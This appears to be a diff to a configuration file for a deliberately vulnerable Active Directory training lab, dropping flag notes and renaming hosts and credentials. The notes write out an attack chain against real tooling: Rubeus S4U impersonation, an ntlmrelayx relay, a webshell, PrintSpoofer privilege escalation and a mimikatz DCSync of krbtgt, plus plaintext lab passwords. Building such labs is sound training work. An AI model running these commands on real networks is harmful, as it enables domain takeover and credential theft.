@@ -1,7 +1,7 @@
 ---
 # ==============================================================================
 # vuln_web_apps/tasks/web_notes.yml — WEB-061..080
-# Target: dc01.corp.local (note drops for AD-integrated web surfaces)
+# Target: coruscant.empire.local (note drops for AD-integrated web surfaces)
 # ==============================================================================
 
 - name: WEB-061..080 - Drop AD-integrated web attack notes
@@ -21,7 +21,7 @@
           S4U2Self + S4U2Proxy to impersonate Domain Admin to backend SQL
 
         Tool: Rubeus s4u /user:svc_iis /aes256:<key> /impersonateuser:Administrator \
-          /msdsspn:MSSQLSvc/sql01.corp.local /ptt
+          /msdsspn:MSSQLSvc/kamino.empire.local /ptt
 
     - path: 'C:\Flags\FLAG-WEB-065-NTLM-WebApp.txt'
       content: |
@@ -32,10 +32,10 @@
         it can be relayed or captured.
 
         Capture: Responder + NTLM capture
-        Relay: ntlmrelayx.py --target smb://dc01.corp.local -tf targets.txt
+        Relay: ntlmrelayx.py --target smb://coruscant.empire.local -tf targets.txt
 
-        Affected URLs: http://file01.corp.local/secure/
-        To test: curl --ntlm -u dvad\jim.halpert:Password123! http://file01.corp.local/secure/
+        Affected URLs: http://scarif.empire.local/secure/
+        To test: curl --ntlm -u dvad\luke.skywalker:SithLord123! http://scarif.empire.local/secure/
 
     - path: 'C:\Flags\FLAG-WEB-070-WebShell-Chain.txt'
       content: |
@@ -46,13 +46,13 @@
         1. Exploit WEB-021 SQLi → extract DB credentials
         2. Use WEB-012 file upload to plant ASPX webshell (no extension filtering)
         3. Webshell runs as svc_iis (WinRM target — IA-087)
-        4. svc_iis has SeImpersonatePrivilege → PrintSpoofer → SYSTEM on file01
-        5. SYSTEM on file01 → dump local creds (DVADlab2024! reuse)
+        4. svc_iis has SeImpersonatePrivilege → PrintSpoofer → SYSTEM on scarif
+        5. SYSTEM on scarif → dump local creds (SithLord123! reuse)
         6. LAPS not deployed → same password on all machines
         7. Lateral movement to DC → DCSync
 
         Full chain:
-          curl -X POST http://file01.corp.local/upload.aspx --data cmd=whoami
+          curl -X POST http://scarif.empire.local/upload.aspx --data cmd=whoami
           → Execute PrintSpoofer.exe
           → Get SYSTEM
-          → mimikatz lsadump::dcsync /domain:corp.local /user:krbtgt
+          → mimikatz lsadump::dcsync /domain:empire.local /user:krbtgt
